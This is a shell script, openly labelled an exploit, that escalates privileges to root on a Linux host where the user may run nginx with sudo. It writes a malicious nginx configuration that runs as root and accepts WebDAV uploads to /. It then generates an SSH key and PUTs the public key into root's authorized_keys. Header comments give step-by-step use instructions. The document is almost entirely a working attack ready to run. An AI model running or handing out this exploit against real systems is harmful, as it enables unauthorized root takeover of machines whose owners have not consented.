# Exploit scenario:
# - You need sudo permissions for nginx (verify with: sudo -l)
# - Place this script in a directory writable by your user (had issues with /tmp)
# - Make it executable (chmod +x exploit.sh) and run it
# - The script generates private key so you can copy it
# - On your attacker machine, save the private key to a file (e.g. root_key), then:
#     chmod 600 root_key
#     ssh -i root_key root@<target_ip>
# Source: https://github.com/DylanGrl/nginx_sudo_privesc

#!/bin/sh

echo "[+] Creating malicious nginx configuration..."
cat << EOF > /tmp/nginx_pwn.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;

events {
    worker_connections 768;
}

http {
    server {
        listen 1339;
        root /;
        autoindex on;
        dav_methods PUT;
    }
}
EOF

echo "[+] Starting nginx with malicious config..."
sudo nginx -c /tmp/nginx_pwn.conf

echo "[+] Generating SSH keypair..."
ssh-keygen

echo "[+] Printing SSH private key (copy this to your attacker machine)..."
cat ~/.ssh/id_rsa

echo "[+] Uploading public key into root's authorized_keys via nginx WebDAV..."
curl -X PUT localhost:1339/root/.ssh/authorized_keys -d "$(cat ~/.ssh/id_rsa.pub)"

echo "[+] Done. Use the SSH private key to log in as root."
